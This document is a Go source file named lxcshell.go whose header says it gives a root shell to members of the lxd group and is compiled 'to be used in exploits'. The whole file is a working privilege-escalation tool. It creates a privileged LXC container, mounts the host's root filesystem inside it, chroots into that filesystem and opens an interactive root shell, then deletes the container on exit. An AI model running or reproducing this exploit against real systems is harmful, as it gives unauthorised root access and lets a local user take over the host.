// lxcshell.go
// Gives a rootshell if you are in the lxd group.
// Compiled to static binary to be used in exploits
// nighter - http://nighter.se
package main

import (
	"fmt"
	"os/exec"
	"os"
    "os/signal"
	"syscall"
    "time"
	gexpect "github.com/ThomasRooney/gexpect"
	"github.com/tebeka/atexit"
)

func handler() {

	cmd := exec.Command("lxc", "delete", "privesc", "-f")
	cmd.Start()
	fmt.Println("Exiting")
}

func main() {

	atexit.Register(handler)

    c := make(chan os.Signal)
    signal.Notify(c, os.Interrupt, syscall.SIGTERM)
    go func() {
        <-c
        handler()
        os.Exit(1)
    }()

    child, err := gexpect.Spawn("/bin/sh")
    if err != nil {
        panic(err)
    }
	
    match, _ := child.ExpectRegex(".*")
    if match == false {
        fmt.Println("Privesc failed")
        os.Exit(1)
    }

    child.SendLine("lxc launch images:alpine/3.8 privesc -c security.privileged=true")
    _, err = child.ExpectTimeoutRegexFind(".*Creating privesc.*", 2 * time.Second)
    if err != nil {
        fmt.Println("Privesc failed")
        os.Exit(1)
    }

    child.SendLine("clear")
	child.SendLine("lxc config device add privesc whatever disk source=/ path=/mnt/root recursive=true 2>/dev/null")
    match3, _ := child.ExpectRegex(".*")
    if match3 == false {
        fmt.Println("Privesc failed")
        os.Exit(1)
    }

    child.SendLine("clear")
    child.SendLine("lxc exec privesc /bin/sh")
    match4, _ := child.ExpectRegex(".*")
    if match4 == false {
        fmt.Println("Privesc failed")
        os.Exit(1)
    }

    child.SendLine("clear")
    child.SendLine("chroot /mnt/root")
    match5, _ := child.ExpectRegex(".*")
    if match5 == false {
        fmt.Println("Privesc failed")
        os.Exit(1)
    }

    child.SendLine("clear") 
	child.Interact()
	atexit.Exit(0)
}

